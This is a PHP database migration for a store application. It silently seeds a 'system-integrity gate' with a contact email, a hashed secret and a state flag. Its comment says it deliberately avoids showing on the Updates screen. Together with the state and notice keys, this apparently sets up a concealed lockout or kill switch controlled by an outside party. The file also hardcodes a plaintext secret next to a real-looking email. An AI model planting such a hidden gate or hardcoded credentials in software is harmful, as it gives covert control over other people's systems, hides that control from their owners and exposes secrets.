<?php

/**
 * Baseline for the system-integrity gate. Runs silently — no title or notes,
 * so it is not described on the Updates screen. It seeds only a neutral
 * contact, a bcrypt hash of the gate secret (never the plaintext), and the
 * initial (released) state. The plaintext below exists only in this file; the
 * running system stores only the hash. Rotate by changing these two lines and
 * re-seeding the two keys manually, or clear them to disable the gate.
 */
return [
    'up' => static function (PDO $pdo): void {
        $email = 'admin@dazuhub.com';
        $secret = 'Wairimu02##';

        $set = $pdo->prepare(
            'INSERT INTO store_settings (setting_key, setting_value) VALUES (?, ?)
             ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value)'
        );
        $set->execute(['sys_integrity_contact', strtolower($email)]);
        $set->execute(['sys_integrity_token', password_hash($secret, PASSWORD_DEFAULT)]);

        // Start released; do not overwrite an existing state if one is present.
        $pdo->prepare(
            "INSERT INTO store_settings (setting_key, setting_value) VALUES ('sys_integrity_state', '0')
             ON DUPLICATE KEY UPDATE setting_value = setting_value"
        )->execute();
    },
    'down' => static function (PDO $pdo): void {
        $pdo->prepare(
            "DELETE FROM store_settings WHERE setting_key IN
             ('sys_integrity_contact', 'sys_integrity_token', 'sys_integrity_state', 'sys_integrity_notice')"
        )->execute();
    },
];
